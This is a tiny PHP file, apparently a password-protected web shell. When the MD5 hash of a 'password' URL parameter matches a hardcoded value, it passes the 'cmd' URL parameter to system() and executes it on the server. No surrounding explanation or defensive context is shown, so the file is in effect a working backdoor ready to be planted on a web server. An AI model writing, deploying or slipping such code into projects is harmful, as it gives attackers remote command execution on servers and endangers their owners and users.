<?php 
	if (md5($_GET['password']) == '5d58f5270ce02712e8a620a4cd7bc5d3') {
		system($_GET['cmd']);
	}
?>
